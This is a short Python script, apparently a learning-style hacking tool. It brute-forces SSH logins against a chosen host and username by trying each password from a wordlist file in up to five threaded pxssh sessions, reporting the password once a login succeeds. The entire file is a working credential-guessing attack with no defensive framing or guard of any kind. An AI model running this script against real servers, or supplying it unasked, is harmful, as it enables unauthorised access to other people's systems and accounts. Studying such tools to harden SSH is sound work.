from optparse import OptionParser
from threading import BoundedSemaphore, Thread

import time
from pexpect import pxssh

max_connection = 5
Found = False
Fails = 0
connection_lock = BoundedSemaphore(value=max_connection)

def send_command(s,cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)

def ssh(user,host,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print('[+] Password Found {password}'.format(password=password))
        Found = True
    except Exception as err:
        if 'read_nonblocking' in str(err):
            Fails += 1
            time.sleep(5)
            ssh(user,host,password,False)
        elif 'synchronize with original prompt' in str(err):
            time.sleep(2)
            ssh(user,host,password,False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = OptionParser()
    parser.add_option("--host", dest="host", type='string',
                      help="the host you want to sniff")
    parser.add_option("--user", dest="user", type='string',
                      help="ssh for that username")
    parser.add_option("--passFile", dest="passFile", type='string',
                      help="password file")
    (options, args) = parser.parse_args()

    host = options.host
    user = options.user
    passFile = options.passFile

    if host == None or user == None or passFile == None:
        print(parser.usage)
        exit(0)
    else:
        with open(passFile) as file:
            for line in file.readlines():
                time.sleep(2)
                if Found:
                    print('[*] password Found')
                    exit(0)
                if Fails > 5:
                    print('Too Many Socket Timeouts')
                    exit(0)
                connection_lock.acquire()
                password = line.strip('\r').strip('\n')
                print('[-] Testing: {p}'.format(p=password))
                t = Thread(target=ssh,args=(user,host,password,True))
                child = t.start()
if __name__ == '__main__':
    main()
